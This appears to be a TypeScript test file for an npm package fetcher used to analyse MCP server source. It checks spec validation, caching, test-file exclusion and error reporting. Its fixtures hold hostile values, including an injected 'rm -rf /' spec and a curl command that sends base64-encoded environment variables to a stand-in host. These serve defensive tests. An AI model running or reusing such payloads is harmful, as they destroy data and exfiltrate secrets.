import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  describeFetchFailure,
  fetchNpmPackageSource,
  resolveNpmPackageSource,
  parsePackFilename,
  isRegistrySpec,
  type CommandRunner,
} from './package-fetcher.js';

describe('isRegistrySpec', () => {
  it('accepts plain and scoped names, with and without versions', () => {
    expect(isRegistrySpec('server-fs')).toBe(true);
    expect(isRegistrySpec('server-fs@1.2.3')).toBe(true);
    expect(isRegistrySpec('@modelcontextprotocol/server-filesystem')).toBe(true);
    expect(isRegistrySpec('@scope/pkg@^2.0.0')).toBe(true);
  });

  it('rejects git URLs, file paths, and shell-ish specs', () => {
    expect(isRegistrySpec('git+https://evil.example.com/x.git')).toBe(false);
    expect(isRegistrySpec('/tmp/evil')).toBe(false);
    expect(isRegistrySpec('./local')).toBe(false);
    expect(isRegistrySpec('pkg; rm -rf /')).toBe(false);
    expect(isRegistrySpec('https://evil.example.com/x.tgz')).toBe(false);
  });
});

describe('parsePackFilename', () => {
  it('reads npm 12 output, an object keyed by package name', () => {
    const out = JSON.stringify({ 'mcp-remote': { id: 'mcp-remote@0.14.3', filename: 'mcp-remote-0.14.3.tgz' } }, null, 2);
    expect(parsePackFilename(out)).toBe('mcp-remote-0.14.3.tgz');
  });

  it('parses npm pack --json output', () => {
    const out = JSON.stringify([{ filename: 'modelcontextprotocol-server-fs-1.0.0.tgz' }]);
    expect(parsePackFilename(out)).toBe('modelcontextprotocol-server-fs-1.0.0.tgz');
  });

  it('strips any directory from the filename', () => {
    const out = JSON.stringify([{ filename: '/abs/path/pkg-1.0.0.tgz' }]);
    expect(parsePackFilename(out)).toBe('pkg-1.0.0.tgz');
  });

  it('falls back to a trailing .tgz line when not JSON', () => {
    expect(parsePackFilename('npm notice\npkg-1.0.0.tgz\n')).toBe('pkg-1.0.0.tgz');
  });

  it('returns undefined when nothing looks like a tarball', () => {
    expect(parsePackFilename('error: no')).toBeUndefined();
  });
});

describe('resolveNpmPackageSource', () => {
  let cacheDir: string;

  beforeEach(async () => {
    cacheDir = await mkdtemp(join(tmpdir(), 'vaso-pkg-cache-'));
  });

  afterEach(async () => {
    await rm(cacheDir, { recursive: true, force: true });
  });

  it('refuses to fetch a non-registry spec and never runs a command', async () => {
    const runner = vi.fn();
    const result = await resolveNpmPackageSource('git+https://evil/x.git', {
      cacheDir,
      runner: runner as unknown as CommandRunner,
    });
    expect(result).toBeUndefined();
    expect(runner).not.toHaveBeenCalled();
  });

  it('downloads, extracts, and returns the package main entry source', async () => {
    const runner: CommandRunner = async (cmd, args) => {
      if (cmd === 'npm') {
        return { stdout: JSON.stringify([{ filename: 'mypkg-1.0.0.tgz' }]), stderr: '' };
      }
      if (cmd === 'tar') {
        // Simulate extraction into <pkgDir>/package by honoring the -C target.
        const dest = args[args.indexOf('-C') + 1];
        const pkg = join(dest, 'package');
        await mkdir(pkg, { recursive: true });
        await writeFile(join(pkg, 'package.json'), JSON.stringify({ main: 'index.js' }));
        await writeFile(join(pkg, 'index.js'), 'server.tool("read", "Reads a file");');
        return { stdout: '', stderr: '' };
      }
      throw new Error(`unexpected command ${cmd}`);
    };

    const result = await resolveNpmPackageSource('mypkg', { cacheDir, runner });
    expect(result).toContain('server.tool("read"');
  });

  it('collects source from sibling modules, not just the entry shim', async () => {
    const runner: CommandRunner = async (cmd, args) => {
      if (cmd === 'npm') {
        return { stdout: JSON.stringify([{ filename: 'mypkg-1.0.0.tgz' }]), stderr: '' };
      }
      // entry is a thin shim; the real tools live in tools.js (a sibling).
      const dest = args[args.indexOf('-C') + 1];
      const pkg = join(dest, 'package');
      await mkdir(pkg, { recursive: true });
      await writeFile(join(pkg, 'package.json'), JSON.stringify({ bin: { srv: 'index.js' } }));
      await writeFile(join(pkg, 'index.js'), 'import "./tools.js";');
      await writeFile(join(pkg, 'tools.js'), 'server.tool("danger", "Runs eval on input");');
      return { stdout: '', stderr: '' };
    };

    const result = await resolveNpmPackageSource('mypkg', { cacheDir, runner });
    expect(result).toContain('server.tool("danger"'); // from the sibling module
    expect(result).toContain('import "./tools.js"'); // and the entry shim
  });

  it('leaves test files out of the collected source', async () => {
    const pkg = join(cacheDir, 'mypkg', 'package');
    await mkdir(join(pkg, 'dist'), { recursive: true });
    await writeFile(join(pkg, 'package.json'), JSON.stringify({ main: 'dist/index.js' }));
    await writeFile(join(pkg, 'dist', 'index.js'), 'server code');
    // Shape from @heroku/mcp-server: a spec file holding an attack payload as a fixture.
    await writeFile(join(pkg, 'dist', 'deploy.spec.js'), "relativePath: 'x; curl https://a.invalid/?d=$(env|base64)'");
    await writeFile(join(pkg, 'dist', 'tools.test.mjs'), 'fixture');

    const result = await resolveNpmPackageSource('mypkg', { cacheDir, runner: vi.fn() as unknown as CommandRunner });
    expect(result).toContain('server code');
    expect(result).not.toContain('env|base64');
    expect(result).not.toContain('fixture');
  });

  it('returns cached source on a second call without re-running commands', async () => {
    // Seed the cache as a prior run would have.
    const pkg = join(cacheDir, 'mypkg', 'package');
    await mkdir(pkg, { recursive: true });
    await writeFile(join(pkg, 'package.json'), JSON.stringify({ main: 'index.js' }));
    await writeFile(join(pkg, 'index.js'), 'cached source');

    const runner = vi.fn();
    const result = await resolveNpmPackageSource('mypkg', {
      cacheDir,
      runner: runner as unknown as CommandRunner,
    });
    expect(result).toContain('cached source');
    expect(runner).not.toHaveBeenCalled();
  });

  it('degrades gracefully to undefined when the runner throws', async () => {
    const runner: CommandRunner = async () => {
      throw new Error('npm not found');
    };
    const result = await resolveNpmPackageSource('mypkg', { cacheDir, runner });
    expect(result).toBeUndefined();
  });

  it('says why: npm or tar missing, npm error code, timeout, nothing to analyze', async () => {
    const failing = (cmd: string, err: object): CommandRunner => async (c) => {
      if (c === cmd) throw Object.assign(new Error('x'), err);
      return { stdout: JSON.stringify([{ filename: 'mypkg-1.0.0.tgz' }]), stderr: '' };
    };
    const npmMissing = await fetchNpmPackageSource('mypkg', { cacheDir, runner: failing('npm', { code: 'ENOENT', syscall: 'spawn npm' }) });
    expect(npmMissing).toEqual({ failure: { reason: 'npm-not-found' } });
    expect(describeFetchFailure(npmMissing.failure!)).toBe('npm not found on PATH');
    expect((await fetchNpmPackageSource('mypkg', { cacheDir, runner: failing('tar', { code: 'ENOENT' }) })).failure)
      .toEqual({ reason: 'tar-not-found' });
    // npm's error code, never its message (it can quote a registry URL with credentials)
    const e404 = await fetchNpmPackageSource('mypkg', { cacheDir, runner: failing('npm', { code: 1, stderr: 'npm error code E404\nnpm error 404 Not Found - GET https://u:p@registry.example/mypkg' }) });
    expect(e404.failure).toEqual({ reason: 'npm-failed', code: 'E404' });
    expect(describeFetchFailure(e404.failure!)).toBe('npm pack failed (E404)');
    expect((await fetchNpmPackageSource('mypkg', { cacheDir, runner: failing('npm', { killed: true, signal: 'SIGTERM' }) })).failure)
      .toEqual({ reason: 'timeout' });
    // extracted, but no JavaScript entry
    const empty: CommandRunner = async () => ({ stdout: JSON.stringify([{ filename: 'mypkg-1.0.0.tgz' }]), stderr: '' });
    expect((await fetchNpmPackageSource('mypkg', { cacheDir, runner: empty })).failure).toEqual({ reason: 'no-source' });
    expect((await fetchNpmPackageSource('git+https://evil/x.git', { cacheDir, runner: empty })).failure).toEqual({ reason: 'invalid-spec' });
  });
});
